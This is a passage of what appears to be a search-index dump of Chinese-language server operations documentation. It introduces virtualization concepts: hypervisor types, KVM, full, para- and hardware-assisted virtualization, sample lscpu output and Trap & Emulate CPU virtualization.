<p>\u200b\u5728\u200b\u670d\u52a1\u5668\u200b\u8fd0\u7ef4\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\uff0c\u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\u7684\u200b\u4f7f\u7528\u200b\u5341\u5206\u200b\u5e38\u89c1\u200b\u3002\u200b\u8fd0\u7ef4\u200b\u4eba\u5458\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5c06\u200b\u670d\u52a1\u5668\u200b\u5212\u5206\u200b\u4e3a\u200b\u82e5\u5e72\u200b\u865a\u62df\u673a\u200b\u8fdb\u884c\u200b\u4f7f\u7528\u200b\uff0c\u200b\u6216\u200b\u4f7f\u7528\u200b\u5bb9\u5668\u200b\u6280\u672f\u200b\u5c06\u200b\u5e94\u7528\u200b\u8fdb\u884c\u200b\u5305\u88c5\u200b\u4e0e\u200b\u9694\u79bb\u200b\uff1b\u200b\u5728\u200b\u9700\u8981\u200b\u7ba1\u7406\u200b\u5927\u91cf\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\u80fd\u591f\u200b\u4e3a\u200b\u96c6\u7fa4\u200b\u7ba1\u7406\u200b\u63d0\u4f9b\u200b\u5e95\u5c42\u200b\u652f\u6301\u200b\uff0c\u200b\u6781\u5927\u5730\u63d0\u9ad8\u200b\u4e86\u200b\u7ba1\u7406\u6548\u7387\u200b\u3002</p> <p>\u200b\u672c\u200b\u90e8\u5206\u200b\u4ecb\u7ecd\u200b\u4e0e\u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\u6709\u5173\u200b\u7684\u200b\u5e38\u7528\u200b\u672f\u8bed\u200b\u548c\u200b\u57fa\u7840\u7406\u8bba\u200b\u77e5\u8bc6\u200b\u3002</p>"},{"location":"ops/virtualization/intro/#_2","title":"\u865a\u62df\u5316\u200b\u6280\u672f\u200b\u7b80\u4ecb","text":"<p>\u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\u662f\u200b\u4e00\u79cd\u200b\u8d44\u6e90\u7ba1\u7406\u200b\u6280\u672f\u200b\uff0c\u200b\u5b83\u200b\u5728\u200b\u4e0b\u5c42\u200b\u8ba1\u7b97\u8d44\u6e90\u200b\u4e0e\u200b\u4e0a\u5c42\u200b\u8f6f\u4ef6\u200b\u4e4b\u95f4\u200b\u6dfb\u52a0\u200b\u4e86\u200b\u4e00\u5c42\u200b\u62bd\u8c61\u200b\u5c42\u200b\uff0c\u200b\u79f0\u4e3a\u200b\u865a\u62df\u5316\u200b\u5c42\u200b\u3002\u200b\u865a\u62df\u5316\u200b\u5c42\u200b\u8d1f\u8d23\u200b\u5206\u5272\u200b\u3001\u200b\u9694\u79bb\u200b\u5e76\u200b\u7ba1\u7406\u200b\u8ba1\u7b97\u8d44\u6e90\u200b\uff0c\u200b\u5e76\u200b\u5c06\u200b\u8d44\u6e90\u200b\u5212\u5206\u200b\u4e3a\u200b\u591a\u4e2a\u200b\u62bd\u8c61\u200b\u7684\u200b\u8d44\u6e90\u200b\u5b9e\u4f8b\u200b\uff0c\u200b\u63d0\u4f9b\u200b\u7ed9\u200b\u4e0a\u5c42\u200b\u8f6f\u4ef6\u200b\u4f7f\u7528\u200b\u3002\u200b\u4e0a\u5c42\u200b\u8f6f\u4ef6\u200b\u62e5\u6709\u200b\u5bf9\u200b\u62bd\u8c61\u200b\u8d44\u6e90\u200b\u7684\u200b\u5b8c\u5168\u200b\u63a7\u5236\u6743\u200b\uff0c\u200b\u7136\u800c\u200b\uff0c\u200b\u5176\u200b\u5bf9\u200b\u7269\u7406\u200b\u8d44\u6e90\u200b\u7684\u200b\u4f7f\u7528\u200b\u4f1a\u200b\u7531\u200b\u865a\u62df\u5316\u200b\u5c42\u200b\u8fdb\u884c\u200b\u8c03\u5ea6\u200b\u548c\u200b\u9650\u5236\u200b\u3002</p> <p>\u200b\u4f7f\u7528\u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\u53ef\u4ee5\u200b\u5e26\u6765\u200b\u8bb8\u591a\u200b\u597d\u5904\u200b\uff1a</p> <ul> <li>\u200b\u8d44\u6e90\u200b\u9694\u79bb\u200b\uff1a\u200b\u5728\u200b\u865a\u62df\u5316\u200b\u5c42\u200b\u672a\u200b\u88ab\u200b\u653b\u51fb\u200b\u6210\u529f\u200b\u7684\u200b\u524d\u63d0\u200b\u4e0b\u200b\uff0c\u200b\u5373\u4f7f\u200b\u4e00\u4e2a\u200b\u865a\u62df\u5316\u200b\u5b9e\u4f8b\u200b\u88ab\u200b\u653b\u51fb\u200b\uff0c\u200b\u4e5f\u200b\u4e0d\u4f1a\u200b\u5f71\u54cd\u200b\u5176\u4ed6\u200b\u865a\u62df\u5316\u200b\u5b9e\u4f8b\u200b\uff0c\u200b\u4ece\u800c\u200b\u63d0\u9ad8\u200b\u5b89\u5168\u6027\u200b\u3002</li> <li>\u200b\u8d44\u6e90\u5171\u4eab\u200b\uff1a\u200b\u4e00\u53f0\u200b\u7269\u7406\u200b\u4e3b\u673a\u200b\u53ef\u4ee5\u200b\u8fd0\u884c\u200b\u591a\u4e2a\u200b\u865a\u62df\u5316\u200b\u5b9e\u4f8b\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u865a\u62df\u5316\u200b\u5b9e\u4f8b\u200b\u80fd\u591f\u200b\u4f7f\u7528\u200b\u7684\u200b\u8d44\u6e90\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u5f39\u6027\u200b\u5206\u914d\u200b\uff0c\u200b\u4ece\u800c\u200b\u63d0\u9ad8\u200b\u8d44\u6e90\u200b\u5229\u7528\u7387\u200b\u3002</li> <li>\u200b\u73af\u5883\u200b\u8fc1\u79fb\u200b\uff1a\u200b\u865a\u62df\u5316\u200b\u5b9e\u4f8b\u200b\u662f\u200b\u8f6f\u4ef6\u200b\u5b9a\u4e49\u200b\u7684\u200b\uff0c\u200b\u62bd\u8c61\u200b\u4e8e\u200b\u5177\u4f53\u200b\u786c\u4ef6\u200b\uff0c\u200b\u56e0\u6b64\u200b\u865a\u62df\u5316\u200b\u5b9e\u4f8b\u200b\u53ef\u4ee5\u200b\u65b9\u4fbf\u200b\u5730\u200b\u79fb\u690d\u200b\u5230\u200b\u4e0d\u540c\u200b\u673a\u5668\u200b\u4e0a\u200b\u8fd0\u884c\u200b\u3002</li> </ul> <p>\u200b\u6839\u636e\u200b\u865a\u62df\u5316\u200b\u5c42\u200b\u6240\u5728\u200b\u7684\u200b\u5c42\u7ea7\u200b\u4e0d\u540c\u200b\uff0c\u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\u53ef\u4ee5\u200b\u5206\u51fa\u200b\u4ee5\u4e0b\u200b\u4e24\u79cd\u200b\u5e38\u89c1\u200b\u7c7b\u578b\u200b\uff1a</p> <ul> <li>\u200b\u786c\u4ef6\u200b\u865a\u62df\u5316\u200b\uff08Hardware virtualization\uff09</li> <li>\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u7ea7\u200b\u865a\u62df\u5316\u200b\uff08OS-level virtualization\uff09</li> </ul> <p>\u200b\u4ee5\u4e0b\u200b\u5c06\u200b\u5177\u4f53\u200b\u4ecb\u7ecd\u200b\u8fd9\u200b\u4e24\u7c7b\u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\u3002</p>"},{"location":"ops/virtualization/intro/#_3","title":"\u786c\u4ef6\u200b\u865a\u62df\u5316","text":""},{"location":"ops/virtualization/intro/#_4","title":"\u6982\u8ff0","text":"<p>\u200b\u5728\u200b\u786c\u4ef6\u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\u4e2d\u200b\uff0c\u200b\u7269\u7406\u200b\u4e3b\u673a\u200b\u88ab\u200b\u5206\u5272\u200b\u4e3a\u200b\u4e00\u53f0\u200b\u6216\u200b\u591a\u53f0\u200b\u865a\u62df\u673a\u200b\uff08Virtual Machine\uff09\u3002\u200b\u6bcf\u53f0\u200b\u865a\u62df\u673a\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u770b\u4f5c\u200b\u4e00\u53f0\u200b\u72ec\u7acb\u200b\u7684\u200b\u201c\u200b\u8ba1\u7b97\u673a\u200b\u201d\uff0c\u200b\u62e5\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b\u865a\u62df\u200b\u786c\u4ef6\u200b\uff08CPU\u3001\u200b\u5185\u5b58\u200b\u3001\u200b\u786c\u76d8\u200b\u3001\u200b\u7f51\u7edc\u63a5\u53e3\u200b\u7b49\u200b\uff09\uff0c\u200b\u8fd0\u884c\u200b\u81ea\u5df1\u200b\u7684\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u548c\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\uff0c\u200b\u901a\u8fc7\u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\u5171\u4eab\u200b\u7269\u7406\u200b\u4e3b\u673a\u200b\u7684\u200b\u786c\u4ef6\u8d44\u6e90\u200b\u3002</p> <p>\u200b\u786c\u4ef6\u200b\u865a\u62df\u5316\u200b\u4f7f\u5f97\u200b\u4e00\u53f0\u200b\u7269\u7406\u200b\u4e3b\u673a\u200b\u80fd\u591f\u200b\u540c\u65f6\u200b\u8fd0\u884c\u200b\u591a\u4e2a\u200b\u4e0d\u540c\u200b\u7684\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\uff0c\u200b\u6b64\u65f6\u200b\uff0c\u200b\u88ab\u200b\u865a\u62df\u5316\u200b\u7684\u200b\u4e0b\u5c42\u200b\u8d44\u6e90\u200b\u5373\u200b\u4e3a\u200b CPU\u3001\u200b\u5185\u5b58\u200b\u3001I/O \u200b\u8bbe\u5907\u200b\u7b49\u200b\u786c\u4ef6\u8d44\u6e90\u200b\u3002\u200b\u7528\u4e8e\u200b\u521b\u5efa\u200b\u3001\u200b\u7ba1\u7406\u200b\u548c\u200b\u6267\u884c\u200b\u865a\u62df\u673a\u200b\u7684\u200b\u865a\u62df\u5316\u200b\u5c42\u200b\u88ab\u200b\u79f0\u4e3a\u200b Hypervisor\uff0c\u200b\u6709\u65f6\u200b\u4e5f\u200b\u88ab\u200b\u79f0\u4e3a\u200b Virtual Machine Monitor\uff08VMM\uff09\u3002\u200b\u88ab\u200b\u865a\u62df\u5316\u200b\u7684\u200b\u7269\u7406\u200b\u4e3b\u673a\u200b\u79f0\u4e3a\u200b\u5bbf\u4e3b\u673a\u200b\uff08Host\uff09\uff0c\u200b\u800c\u200b\u5206\u5272\u200b\u51fa\u200b\u7684\u200b\u865a\u62df\u673a\u200b\u79f0\u4e3a\u200b\u5ba2\u6237\u673a\u200b\uff08Guest\uff09\u3002</p> <p>\u200b\u5728\u200b 1973 \u200b\u5e74\u200b\u7684\u200b\u8bba\u6587\u200b\u300aArchitectural Principles for Virtual Computer Systems\u300b\u200b\u4e2d\u200b\uff0cRobert P. Goldberg \u200b\u5c06\u200b Hypervisor \u200b\u5206\u6210\u200b\u4ee5\u4e0b\u200b\u4e24\u7c7b\u200b\uff1a</p> <ul> <li> <p>Type-1/Native/Bare-metal Hypervisor</p> <ul> <li>Hypervisor \u200b\u76f4\u63a5\u200b\u8fd0\u884c\u200b\u5728\u200b\u786c\u4ef6\u200b\u4e0a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8c03\u5ea6\u200b\u786c\u4ef6\u8d44\u6e90\u200b</li> <li>\u200b\u6027\u80fd\u200b\u635f\u8017\u200b\u4f4e\u200b\uff0c\u200b\u4f46\u200b\u4f7f\u7528\u200b\u7684\u200b\u7075\u6d3b\u200b\u5ea6\u200b\u4e5f\u200b\u8f83\u200b\u4f4e\u200b\uff0c\u200b\u9002\u5408\u200b\u5728\u200b\u670d\u52a1\u5668\u200b\u73af\u5883\u200b\u4e0b\u200b\u4f7f\u7528\u200b</li> <li>\u200b\u4f8b\u200b\uff1aVMware ESXi\u3001Xen\u3001Microsoft Hyper-V</li> </ul> </li> <li> <p>Type-2/Hosted Hypervisor</p> <ul> <li>Hypervisor \u200b\u4f5c\u4e3a\u200b\u5bbf\u4e3b\u673a\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u4e0a\u200b\u7684\u200b\u5e94\u7528\u200b\u7a0b\u5e8f\u8fd0\u884c\u200b</li> <li>\u200b\u9700\u8981\u200b\u901a\u8fc7\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u5b9e\u73b0\u200b\u8d44\u6e90\u200b\u8c03\u5ea6\u200b\uff0c\u200b\u56e0\u6b64\u200b\u6027\u80fd\u200b\u635f\u8017\u200b\u8f83\u200b\u9ad8\u200b</li> <li>\u200b\u4f8b\u200b\uff1aVMware Workstation\u3001Oracle VM VirtualBox</li> </ul> </li> </ul> <p>\u200b\u800c\u200b Linux KVM \u200b\u7684\u200b\u60c5\u5f62\u200b\u8f83\u4e3a\u200b\u7279\u6b8a\u200b\uff1a</p> <ul> <li>\u200b\u4f5c\u4e3a\u200b\u5185\u6838\u6a21\u5757\u200b\uff0cKVM \u200b\u5c06\u200b Linux \u200b\u5185\u6838\u200b\u8f6c\u53d8\u200b\u4e3a\u200b\u4e00\u4e2a\u200b Type-1 Hypervisor\uff0c\u200b\u540c\u65f6\u200b\u53c8\u200b\u4fdd\u7559\u200b\u4e86\u200b\u5185\u6838\u200b\u7684\u200b\u5168\u90e8\u200b\u529f\u80fd\u200b\uff0c\u200b\u7531\u200b KVM \u200b\u521b\u5efa\u200b\u548c\u200b\u8c03\u5ea6\u200b\u7684\u200b\u865a\u62df\u200b\u673a\u4f1a\u200b\u4e0e\u200b\u5185\u6838\u200b\u4e0b\u200b\u8fd0\u884c\u200b\u7684\u200b\u5e38\u89c4\u200b\u8fdb\u7a0b\u200b\u5171\u4eab\u200b\u786c\u4ef6\u8d44\u6e90\u200b</li> <li>KVM \u200b\u4e0d\u200b\u8d1f\u8d23\u200b\u786c\u4ef6\u200b\u6a21\u62df\u200b\uff0c\u200b\u800c\u662f\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u200b\u63d0\u4f9b\u200b CPU \u200b\u548c\u200b\u5185\u5b58\u200b\u865a\u62df\u5316\u200b\u652f\u6301\u200b\uff0c\u200b\u7ed3\u5408\u200b\u786c\u4ef6\u200b\u8f85\u52a9\u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\u5b9e\u73b0\u200b\u52a0\u901f\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5e38\u200b\u4e0e\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b QEMU \u200b\u7ed3\u5408\u200b\u4f7f\u7528\u200b\uff0c\u200b\u79f0\u4e3a\u200b QEMU/KVM</li> </ul> <p>\u200b\u5173\u4e8e\u200b QEMU/KVM \u200b\u7684\u200b\u66f4\u200b\u591a\u200b\u4ecb\u7ecd\u200b\uff0c\u200b\u8bf7\u200b\u53c2\u8003\u200b\u672c\u200b\u6587\u6863\u200b\u7684\u200b QEMU/KVM \u200b\u90e8\u5206\u200b\u3002</p> <p>\u200b\u5b8c\u6574\u200b\u7684\u200b\u786c\u4ef6\u200b\u865a\u62df\u5316\u200b\u89e3\u51b3\u65b9\u6848\u200b\u9664\u4e86\u200b\u63d0\u4f9b\u200b Hypervisor \u200b\u8fd9\u6837\u200b\u7684\u200b\u865a\u62df\u5316\u200b\u57fa\u7840\u8bbe\u65bd\u200b\u4e4b\u5916\u200b\uff0c\u200b\u4e00\u822c\u200b\u8fd8\u4f1a\u200b\u9644\u5e26\u200b\u56fe\u5f62\u5316\u200b\u7ba1\u7406\u200b\u754c\u9762\u200b\u548c\u200b\u547d\u4ee4\u884c\u200b\u63a5\u53e3\u200b\uff0c\u200b\u5e2e\u52a9\u200b\u7ba1\u7406\u5458\u200b\u5b8c\u6210\u200b\u865a\u62df\u673a\u200b\u914d\u7f6e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b\u4e0b\u6587\u200b \u200b\u5e38\u89c1\u200b\u670d\u52a1\u5668\u200b\u865a\u62df\u5316\u200b\u65b9\u6848\u200b \u200b\u7684\u200b\u914d\u56fe\u200b\u3002</p>"},{"location":"ops/virtualization/intro/#x86","title":"x86 \u200b\u865a\u62df\u5316\u200b\u5b9e\u73b0","text":"<p>\u200b\u5bf9\u4e8e\u200b x86 \u200b\u5e73\u53f0\u200b\uff0c\u200b\u6709\u200b\u591a\u79cd\u200b\u6280\u672f\u200b\u8def\u7ebf\u200b\u6765\u200b\u5b9e\u73b0\u200b\u786c\u4ef6\u200b\u865a\u62df\u5316\u200b\uff0c\u200b\u5305\u62ec\u200b\uff1a</p> <ul> <li> <p>\u200b\u5b8c\u5168\u200b\u865a\u62df\u5316\u200b\uff08Full Virtualization\uff09</p> <ul> <li>\u200b\u865a\u62df\u5316\u200b\u5b9e\u73b0\u200b\u96c6\u4e2d\u200b\u5728\u200b Hypervisor \u200b\u4e0a\u200b\uff0c\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u53ef\u4ee5\u200b\u4e0d\u200b\u7ecf\u200b\u4fee\u6539\u200b\u5730\u200b\u5728\u200b Hypervisor \u200b\u4e0a\u200b\u8fd0\u884c\u200b</li> <li>\u200b\u603b\u4f53\u200b\u6765\u8bf4\u200b\uff0c\u200b\u517c\u5bb9\u6027\u200b\u597d\u200b\uff0c\u200b\u4f46\u200b\u6027\u80fd\u200b\u53ef\u80fd\u200b\u8f83\u4e3a\u200b\u4f4e\u4e0b\u200b</li> </ul> </li> <li> <p>\u200b\u534a\u200b\u865a\u62df\u5316\u200b\uff08Paravirtualization\uff09</p> <ul> <li>\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u4e0e\u200b Hypervisor \u200b\u901a\u8fc7\u200b\u9884\u5148\u200b\u7ea6\u5b9a\u200b\u597d\u200b\u7684\u200b\u63a5\u53e3\u200b\u534f\u4f5c\u200b\u8fd0\u884c\u200b\uff0c\u200b\u4e00\u822c\u200b\u9700\u8981\u200b\u901a\u8fc7\u200b\u4fee\u6539\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u5185\u6838\u200b\uff0c\u200b\u6216\u200b\u5411\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u4e2d\u200b\u6dfb\u52a0\u200b\u9a71\u52a8\u200b\u6765\u200b\u5b9e\u73b0\u200b</li> <li>\u200b\u6027\u80fd\u200b\u4e0a\u200b\u4e00\u822c\u200b\u5f3a\u4e8e\u200b\u5b8c\u5168\u200b\u865a\u62df\u5316\u200b\uff0c\u200b\u4f46\u200b\u517c\u5bb9\u6027\u200b\u4e0a\u200b\u53ef\u80fd\u200b\u7565\u900a\u4e00\u7b79\u200b</li> </ul> </li> <li> <p>\u200b\u786c\u4ef6\u200b\u8f85\u52a9\u200b\u865a\u62df\u5316\u200b\uff08Hardware Assisted Virtualization\uff09</p> <ul> <li>\u200b\u901a\u8fc7\u200b\u96c6\u6210\u200b\u865a\u62df\u5316\u200b\u64cd\u4f5c\u200b\u76f8\u5173\u200b\u7684\u200b\u786c\u4ef6\u200b\uff0c\u200b\u4ee5\u200b\u63d0\u9ad8\u200b\u6027\u80fd\u200b\uff0c\u200b\u7b80\u5316\u200b\u865a\u62df\u5316\u200b\u76f8\u5173\u200b\u7684\u200b\u8f6f\u4ef6\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u4e00\u822c\u200b\u4e0e\u200b\u4e0a\u8ff0\u200b\u4e24\u79cd\u200b\u865a\u62df\u5316\u200b\u65b9\u5f0f\u200b\u7ed3\u5408\u200b\u4f7f\u7528\u200b</li> <li>\u200b\u76ee\u524d\u200b\uff0cx86 \u200b\u5e73\u53f0\u200b\u4e0a\u200b\u51e0\u4e4e\u200b\u6240\u6709\u200b Hypervisor \u200b\u7684\u200b\u9ad8\u6548\u200b\u8fd0\u884c\u200b\u90fd\u200b\u4f9d\u8d56\u4e8e\u200b\u8fd9\u200b\u7c7b\u200b\u6280\u672f\u200b</li> </ul> </li> </ul> <p>\u200b\u4f60\u200b\u7684\u200b CPU \u200b\u662f\u5426\u200b\u652f\u6301\u200b\u786c\u4ef6\u200b\u865a\u62df\u5316\u200b\u6269\u5c55\u200b\uff1f</p> <p>\u200b\u73b0\u4ee3\u200b\u4e3b\u6d41\u200b\u7684\u200b x86-64 CPU \u200b\u90fd\u200b\u5e94\u5f53\u200b\u652f\u6301\u200b\u8fd9\u200b\u7c7b\u200b\u6269\u5c55\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>lscpu</code> \u200b\u7b49\u200b\u5de5\u5177\u200b\u6765\u200b\u68c0\u67e5\u200b\u8fd9\u200b\u4e00\u70b9\u200b\uff1a</p> <pre><code>\u27e9 lscpu\nArchitecture:             x86_64\nCPU op-mode(s):         32-bit, 64-bit\nAddress sizes:          39 bits physical, 48 bits virtual\nByte Order:             Little Endian\nCPU(s):                   20\nOn-line CPU(s) list:    0-19\nVendor ID:                GenuineIntel\nModel name:             12th Gen Intel(R) Core(TM) i7-12700H\n    CPU family:           6\n    Model:                154\n    Thread(s) per core:   2\n    Core(s) per socket:   14\n    Socket(s):            1\n    Stepping:             3\n    CPU(s) scaling MHz:   20%\n    CPU max MHz:          4700.0000\n    CPU min MHz:          400.0000\n    BogoMIPS:             5376.00\n    Flags:                ... vmx ept ept_ad ...\n\nVirtualization features:\nVirtualization:         VT-x\n\n# \u200b\u4ee5\u4e0b\u200b\u8f93\u51fa\u200b\u7701\u7565\u200b\n# ...\n</code></pre> <p>\u200b\u5176\u4e2d\u200b\uff0cFlags \u200b\u4e2d\u200b\u7684\u200b <code>vmx</code> \u200b\u8868\u793a\u200b CPU \u200b\u652f\u6301\u200b Intel \u200b\u865a\u62df\u673a\u200b\u6269\u5c55\u200b\uff08VT-x\uff09\u200b\u6280\u672f\u200b\uff0c<code>ept</code> \u200b\u8868\u793a\u200b CPU \u200b\u652f\u6301\u200b\u6269\u5c55\u200b\u9875\u8868\u200b\uff08Extended Page Tables\uff09\u200b\u6280\u672f\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u786c\u4ef6\u200b\u8f85\u52a9\u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\u4e5f\u200b\u5c06\u200b\u5728\u4e0b\u6587\u200b\u63d0\u53ca\u200b\u3002</p> <p>\u200b\u4ee5\u4e0b\u200b\u5c06\u200b\u4ece\u200b CPU\u3001\u200b\u5185\u5b58\u200b\u3001I/O \u200b\u865a\u62df\u5316\u200b\u4e09\u4e2a\u200b\u90e8\u5206\u200b\u6765\u200b\u7b80\u8981\u200b\u4ecb\u7ecd\u200b\u786c\u4ef6\u200b\u865a\u62df\u5316\u200b\u7684\u200b\u5b9e\u73b0\u200b\u3002\u200b\u8fd9\u91cc\u200b\u63d0\u5230\u200b\u7684\u200b\u5b9e\u73b0\u200b\u6280\u672f\u200b\u53ef\u80fd\u200b\u5df2\u7ecf\u200b\u8fc7\u65f6\u200b\uff0c\u200b\u4f46\u200b\u5b83\u4eec\u200b\u6709\u52a9\u4e8e\u200b\u7406\u89e3\u200b\u5b9e\u73b0\u200b\u865a\u62df\u5316\u200b\u7684\u200b\u57fa\u672c\u539f\u7406\u200b\u3002</p>"},{"location":"ops/virtualization/intro/#cpu","title":"CPU \u200b\u865a\u62df\u5316","text":"<p>CPU \u200b\u865a\u62df\u5316\u200b\u7684\u200b\u4e00\u4e2a\u200b\u7ecf\u5178\u200b\u67b6\u6784\u200b\u88ab\u200b\u79f0\u4e3a\u200b\u300cTrap &amp; Emulate\u300d\uff0c\u200b\u5176\u200b\u5927\u81f4\u200b\u601d\u60f3\u200b\u662f\u200b\uff1a\u200b\u975e\u200b\u654f\u611f\u200b\u6307\u4ee4\u200b\u5728\u200b Guest OS \u200b\u4e0a\u200b\u76f4\u63a5\u200b\u6267\u884c\u200b\uff0c\u200b\u654f\u611f\u200b\u6307\u4ee4\u200b\u9677\u5165\u200b\u5230\u200b Hypervisor \u200b\u8fdb\u884c\u200b\u6a21\u62df\u200b\u3002\u200b\u7136\u800c\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u6a21\u578b\u200b\u5bf9\u4e8e\u200b\u786c\u4ef6\u200b\u67b6\u6784\u8bbe\u8ba1\u200b\u5b58\u5728\u200b\u8981\u6c42\u200b\uff0c\u200b\u800c\u200b x86 \u200b\u67b6\u6784\u200b\u5728\u200b\u6700\u521d\u200b\u8bbe\u8ba1\u200b\u65f6\u200b\u5e76\u672a\u200b\u8003\u8651\u200b\u5230\u200b\u865a\u62df\u5316\u200b\u7684\u200b\u573a\u666f\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u6ee1\u8db3\u200b\u524d\u63d0\u6761\u4ef6\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u200b\u65e0\u6cd5\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\u8fd9\u79cd\u200b\u67b6\u6784\u200b\uff0c\u200b\u5728\u200b x86 \u200b\u865a\u62df\u5316\u200b\u53d1\u5c55\u200b\u7684\u200b\u65e9\u671f\u200b\uff0c\u200b\u53ea\u80fd\u200b\u91c7\u53d6\u200b\u4e00\u4e9b\u200b\u53d8\u901a\u65b9\u6cd5\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b\u5b8c\u5168\u200b\u865a\u62df\u5316\u200b\u6765\u8bf4\u200b\uff0c\u200b\u4e00\u79cd\u200b\u5b9e\u73b0\u200b\u662f\u200b\u91c7\u7528\u200b\u76f4\u63a5\u200b\u6307\u4ee4\u200b\u6267\u884c\u200b\u4e0e\u200b\u4e8c\u8fdb\u5236\u200b\u7ffb\u8bd1\u200b\u76f8\u7ed3\u5408\u200b\u7684\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u5728\u200b\u8fd0\u884c\u200b\u65f6\u200b\u52a8\u6001\u5206\u6790\u200b Guest OS \u200b\u6267\u884c\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0c\u200b\u7528\u200b\u4e8c\u8fdb\u5236\u200b\u7ffb\u8bd1\u200b\u6a21\u5757\u200b\u6765\u200b\u66ff\u6362\u200b\u6389\u200b\u5176\u4e2d\u200b\u96be\u4ee5\u200b\u865a\u62df\u5316\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0cVMware Workstation \u200b\u5728\u200b\u65e9\u671f\u200b\u5c31\u200b\u91c7\u7528\u200b\u8fd9\u79cd\u200b CPU \u200b\u865a\u62df\u5316\u200b\u7684\u200b\u65b9\u6cd5\u200b\u3002\u200b\u7136\u800c\u200b\uff0c\u200b\u52a8\u6001\u200b\u4e8c\u8fdb\u5236\u200b\u7ffb\u8bd1\u200b\u5b9e\u73b0\u200b\u8d77\u6765\u200b\u76f8\u5bf9\u200b\u590d\u6742\u200b\uff0c\u200b\u4e14\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5e26\u6765\u200b\u8f83\u5927\u200b\u7684\u200b\u8fd0\u884c\u200b\u65f6\u200b\u5f00\u9500\u200b\u3002</p> <p>\u200b\u81f3\u4e8e\u200b\u534a\u200b\u865a\u62df\u5316\u200b\uff0c\u200b\u4ee5\u200b Xen \u200b\u6700\u521d\u200b\u7684\u200b\u5b9e\u73b0\u200b \u200b\u4e3a\u4f8b\u200b\uff0cHypervisor \u200b\u8fd0\u884c\u200b\u5728\u200b Ring 0\uff0cGuest OS \u200b\u88ab\u200b\u4fee\u6539\u200b\u4ee5\u200b\u5728\u200b Ring 1 \u200b\u8fd0\u884c\u200b\uff0c\u200b\u800c\u200b Guest OS \u200b\u4e0a\u200b\u7684\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u4ecd\u7136\u200b\u5728\u200b Ring 3 \u200b\u8fd0\u884c\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u5f53\u200b Guest OS \u200b\u8bd5\u56fe\u200b\u76f4\u63a5\u200b\u6267\u884c\u200b\u7279\u6743\u200b\u6307\u4ee4\u200b\u65f6\u200b\uff0c\u200b\u4f1a\u200b\u56e0\u4e3a\u200b\u6743\u9650\u200b\u4e0d\u8db3\u200b\u800c\u200b\u5931\u8d25\u200b\uff1b\u200b\u53d6\u800c\u4ee3\u4e4b\u200b\u5730\u200b\uff0cGuest OS \u200b\u9700\u8981\u200b\u901a\u8fc7\u200b Hypercall \u200b\u63a5\u53e3\u200b\u9677\u5165\u200b\u5230\u200b Hypervisor \u200b\u4e2d\u200b\uff0c\u200b\u624d\u80fd\u200b\u6267\u884c\u200b\u7279\u6743\u200b\u6307\u4ee4\u200b\u3002\u200b\u9664\u6b64\u4e4b\u5916\u200b\u7684\u200b\u4e00\u4e9b\u200b\u8bbe\u8ba1\u200b\uff1a</p> <ul> <li>\u200b\u5f02\u5e38\u200b\u5904\u7406\u200b\uff1aGuest OS \u200b\u7684\u200b\u5f02\u5e38\u200b\u5904\u7406\u200b\u5927\u4f53\u200b\u4e0e\u200b\u539f\u751f\u200b x86 \u200b\u73af\u5883\u200b\u4e00\u81f4\u200b\uff0c\u200b\u53ea\u662f\u200b\u5728\u200b\u67d0\u4e9b\u200b\u7279\u6743\u200b\u64cd\u4f5c\u200b\u4e0a\u200b\uff08\u200b\u5982\u200b Page Fault \u200b\u7684\u200b\u5904\u7406\u200b\uff09\u200b\u9700\u8981\u200b\u901a\u8fc7\u200b Hypercall \u200b\u83b7\u5f97\u200b Hypervisor \u200b\u7684\u200b\u534f\u52a9\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5728\u200b System Call \u200b\u65f6\u200b\u901a\u8fc7\u200b\u4e00\u4e2a\u200b Fast Handler \u200b\u6765\u200b\u51cf\u5c11\u200b\u5f00\u9500\u200b</li> 